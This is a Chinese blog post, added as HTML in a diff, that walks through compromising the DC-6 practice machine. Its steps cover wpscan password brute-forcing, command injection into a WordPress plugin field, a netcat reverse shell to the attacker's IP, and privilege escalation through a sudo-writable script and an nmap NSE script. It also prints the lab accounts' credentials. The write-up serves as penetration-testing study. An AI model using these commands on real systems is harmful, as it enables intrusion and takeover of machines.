@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本次学习的是DC-6靶机，涉及wpscan爆破，命令注入，反弹shell，以及nmap提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-6靶机复现">
+<meta property="og:url" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="知鱼的Blog">
+<meta property="og:description" content="本次学习的是DC-6靶机，涉及wpscan爆破，命令注入，反弹shell，以及nmap提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/0.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/13.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/14.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/16.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/17.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/18.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/19.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/20.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/21.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/22.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/23.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/29.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/24.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/25.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/26.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/27.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/28.png">
+<meta property="article:published_time" content="2025-06-09T10:47:18.000Z">
+<meta property="article:modified_time" content="2025-06-11T15:10:36.910Z">
+<meta property="article:author" content="zh1yu">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/1.png">
+
+<link rel="canonical" href="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DC-6靶机复现 | 知鱼的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">知鱼的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zh1yu2.jpg">
+      <meta itemprop="name" content="zh1yu">
+      <meta itemprop="description" content="花有重开日,人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="知鱼的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DC-6靶机复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-06-09 18:47:18" itemprop="dateCreated datePublished" datetime="2025-06-09T18:47:18+08:00">2025-06-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-11 23:10:36" itemprop="dateModified" datetime="2025-06-11T23:10:36+08:00">2025-06-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 本次学习的是DC-6靶机，涉及wpscan爆破，命令注入，反弹shell，以及nmap提权</p>
+<span id="more"></span>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看靶机的mac地址：</p>
+<p><img src="1.png" alt="图片"></p>
+<p>arp扫描主机ip：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="0.png" alt="图片"></p>
+<p>ip是<strong>192.168.130.146</strong></p>
+<p>使用nmap扫描开放的端口和服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.130.146</span><br></pre></td></tr></table></figure>
+<p><img src="2.png" alt="图片"></p>
+<p>开发了22的ssh服务和80的web服务</p>
+<p>尝试暴力破解ssh的账户和密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=ssh-brute 192.168.130.146</span><br></pre></td></tr></table></figure>
+<p>爆破失败无解</p>
+<p>查看web端，发现无法访问，而且url栏变成wordy，我们需要修改hosts文件配置：</p>
+<p><img src="3.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>加入<code>192.168.130.146 wordy</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.130.146 wordy</span><br></pre></td></tr></table></figure>
+<p><img src="4.png" alt="图片"></p>
+<p>然后扫描web服务存在哪些文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.130.146</span><br></pre></td></tr></table></figure>
+<p><img src="5.png" alt="图片"></p>
+<p>发现了登录入口，可是没有用户名和密码，使用<strong>wpscan</strong>爆破用户名</p>
+<p><img src="6.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -e </span><br></pre></td></tr></table></figure>
+<p><img src="7.png" alt="图片"></p>
+<p>将用户名打包到一个文件内：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">graham</span><br><span class="line">sarah</span><br><span class="line">mark</span><br><span class="line">jens</span><br></pre></td></tr></table></figure>
+<p><img src="8.png" alt="图片"></p>
+<p><img src="9.png" alt="图片"></p>
+<p>然后使用kali自带的密码字典进行爆破：</p>
+<p>先对该密码字典解压：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -dk /usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure>
+<p><img src="10.png" alt="图片"></p>
+<p>wpscan进行爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -U user.txt -P /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="11.png" alt="图片"></p>
+<p>发现速度太慢，但dc-6给了我们提示，可以筛选出包含 <code>k01</code> 的行（筛选出密码中带k01）</p>
+<p><img src="12.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>
+<p><img src="13.png" alt="图片"></p>
+<p>我们可以使用wpscan，bp，hydra，medusa等进行爆破，这里使用wpscan：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -U user.txt -P passwords.txt</span><br></pre></td></tr></table></figure>
+<p><img src="14.png" alt="图片"></p>
+<p>成功找到账号密码：<strong>mark—helpdesk01</strong></p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>登录web端，发现了存在的注入点：</p>
+<p><img src="16.png" alt="图片"></p>
+<p>这里有一个ip转换的功能，我们使用|进行拼接，测试拼接后的命令能否执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.1 | <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+<p><img src="17.png" alt="图片"></p>
+<p>既然能够执行，那我们反弹shell，这里因为输入的长度有限制，所以我们用bp进行反弹：</p>
+<p>先开启监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+<p><img src="18.png" alt="图片"></p>
+<p>反弹：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.1 | nc 192.168.130.128 8888 -e /bin/sh</span><br></pre></td></tr></table></figure>
+<p><img src="19.png" alt="图片"></p>
+<p><img src="20.png" alt="图片"></p>
+<p>成功反弹，开启交互式shell（反弹得到的shell会有更多的限制）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在用户mark目录下发现一个txt文件，发现里面有graham的密码</p>
+<p><img src="21.png" alt="图片"></p>
+<p><strong>graham - GSo7isUM1D4</strong></p>
+<p>直接切换到graham用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su graham </span><br></pre></td></tr></table></figure>
+<p><img src="22.png" alt="图片"></p>
+<p>查看可以以root权限执行的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+<p><img src="23.png" alt="图片"></p>
+<p>发现可以无密码以jens用户来执行backup.sh文件</p>
+<p>发现sh内容是一个压缩命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="29.png" alt="图片"></p>
+<p>既然该脚本可以执行，那我们就可以把一个打开bash的命令加入backups.sh中，然后执行该backups.sh脚本文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; /home/jens/backups.sh</span><br><span class="line"><span class="built_in">sudo</span> /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="24.png" alt="图片"></p>
+<p>这里失败了，因为必须以jens用户执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="25.png" alt="图片"></p>
+<p>成功切换到jens用户，查看其可以执行的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+<p><img src="26.png" alt="图片"></p>
+<p>有namp命令，尝试提权，我们可以写一个nse脚本，脚本中写入打开一个新的shell，那我们就可以以root用户的身份切换到该shell中</p>
+<p>我们先把打开shell的命令写入getshell.nse，然后用nmap执行该脚本即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt;getshell.nse</span><br><span class="line"><span class="built_in">sudo</span> nmap --script=getshell.nse</span><br></pre></td></tr></table></figure>
+<p><img src="27.png" alt="图片"></p>
+<div class="note info">
+            <p>这里有另外一种namp提权的方式，可以参考这篇文章：</p><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/#sudo">https://gtfobins.github.io/gtfobins/nmap/#sudo</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="variable">$TF</span></span><br><span class="line">nmap --script=<span class="variable">$TF</span></span><br></pre></td></tr></table></figure>
+          </div>
+<p>成功拿到root权限，最后只需要找到flag即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br><span class="line"><span class="built_in">cat</span> /root/theflag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="28.png" alt="图片"></p>
+<p><strong>“世界上只有一种真正的英雄主义，那就是在认识生活的真相后依然热爱生活” —罗曼罗兰</strong></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xdbzdgx/article/details/121589649">https://blog.csdn.net/xdbzdgx/article/details/121589649</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>zh1yu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://zh1yu.xyz/2025/06/09/DC-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" title="DC-6靶机复现">http://zh1yu.xyz/2025/06/09/DC-6靶机复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/08/hexo-next%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9%E9%80%8F%E6%98%8E%E5%BA%A6/" rel="prev" title="hexo_next主题修改透明度">
+      <i class="fa fa-chevron-left"></i> hexo_next主题修改透明度
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">命令注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zh1yu"
+      src="/images/zh1yu2.jpg">
+  <p class="site-author-name" itemprop="name">zh1yu</p>
+  <div class="site-description" itemprop="description">花有重开日,人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/1182418846@qq.com" title="QQ → 1182418846@qq.com"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class=""></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zh1yu</span>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="/js/snow.js"></script>
+
+</body>
+</html>
